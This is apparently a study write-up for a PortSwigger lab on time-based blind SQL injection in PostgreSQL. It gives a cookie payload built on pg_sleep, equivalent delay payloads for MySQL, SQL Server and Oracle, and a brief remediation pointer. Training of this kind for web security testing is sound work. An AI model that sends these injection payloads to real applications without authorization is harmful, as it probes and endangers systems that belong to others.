# Lab 14 — Blind SQL injection with time delays

| | |
|---|---|
| **Difficulty** | 🟨 Practitioner |
| **Category** | Blind SQLi (time) |
| **Concept** | [11 — Time-based blind SQLi](https://portswigger.net/web-security/sql-injection) |
| **PortSwigger** | https://portswigger.net/web-security/sql-injection/blind/lab-time-delays |

---

## 🎯 Objective
The `TrackingId` cookie is injectable but there's **no visible output and no error difference**. Prove the vulnerability by causing a **time delay** in the response. Engine: **PostgreSQL**.

## 🧠 Background
When neither content nor errors differ, force the database to **pause**. A response that takes ~10 seconds proves your injected SQL executed. PostgreSQL's delay function is `pg_sleep()`.

## 🪜 Methodology
1. Edit the `TrackingId` cookie and append a sleep, joined with `||` (string concat) so it's syntactically valid inside the string context:
   ```sql
   TrackingId=xyz'||pg_sleep(10)--
   ```
2. Send the request in Burp **Repeater** and watch the timer — a **~10s** response solves the lab.

## 💥 Payload
```
Cookie: TrackingId=xyz'||pg_sleep(10)--
```

### Equivalents on other engines
```sql
-- MySQL
' AND SLEEP(10)--
-- Microsoft SQL Server
'; WAITFOR DELAY '0:0:10'--
-- Oracle
' || (SELECT CASE WHEN 1=1 THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual)--
```

## ✅ Why it works
`pg_sleep(10)` blocks the query for 10 seconds. Since the app waits on the query before responding, the delay propagates to your HTTP response — an observable, reliable signal even with zero output.

## 🛡️ Remediation
Parameterize the query. See [16 — Prevention](https://portswigger.net/web-security/sql-injection).

## 🔑 Takeaway
The clock is an output channel: a conditional delay is a boolean oracle. `#sqli` `#practitioner` `#blind` `#time-based`
